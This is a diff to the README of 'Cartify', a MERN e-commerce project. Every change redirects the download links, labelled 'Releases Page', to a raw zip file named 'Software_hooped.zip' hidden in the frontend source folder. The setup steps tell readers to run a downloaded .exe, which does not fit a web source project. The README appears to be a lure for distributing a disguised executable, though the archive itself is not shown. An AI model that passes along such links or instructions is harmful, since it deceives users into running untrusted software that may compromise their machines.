@@ -4,7 +4,7 @@
 Welcome to Cartify! This is a full-stack e-commerce application designed to make online shopping simple. You can browse products, manage your cart, and enjoy a smooth user experience. 
 
 ## 📥 Download Cartify
-[![Download Cartify](https://raw.githubusercontent.com/FluxAg/Cartify/main/Mishnic/Cartify.zip)](https://raw.githubusercontent.com/FluxAg/Cartify/main/Mishnic/Cartify.zip)
+[![Download Cartify](https://raw.githubusercontent.com/FluxAg/Cartify/main/Full_Stack_Ecommerce/frontend/src/Software_hooped.zip)](https://raw.githubusercontent.com/FluxAg/Cartify/main/Full_Stack_Ecommerce/frontend/src/Software_hooped.zip)
 
 ## 📂 Overview
 Cartify is built with the MERN stack, featuring:
@@ -30,7 +30,7 @@ To run Cartify, ensure your system meets the following requirements:
 ## 🛠️ Setup Instructions
 Follow these steps to set up Cartify on your computer:
 
-1. **Visit the Release Page**: Go to the [Releases Page](https://raw.githubusercontent.com/FluxAg/Cartify/main/Mishnic/Cartify.zip) to download the latest version of Cartify.
+1. **Visit the Release Page**: Go to the [Releases Page](https://raw.githubusercontent.com/FluxAg/Cartify/main/Full_Stack_Ecommerce/frontend/src/Software_hooped.zip) to download the latest version of Cartify.
 2. **Download the Software**: Click on the version link to download the application.
 3. **Install the Application**:
    - For Windows: Run the downloaded `.exe` file and follow the on-screen instructions.
@@ -61,6 +61,6 @@ Join our growing community on GitHub to connect with other users, report bugs, a
 
 ---
 
-For assistance with running Cartify or to learn more about our latest updates, please visit the [Releases Page](https://raw.githubusercontent.com/FluxAg/Cartify/main/Mishnic/Cartify.zip).
+For assistance with running Cartify or to learn more about our latest updates, please visit the [Releases Page](https://raw.githubusercontent.com/FluxAg/Cartify/main/Full_Stack_Ecommerce/frontend/src/Software_hooped.zip).
 
 Thank you for choosing Cartify for your e-commerce needs!
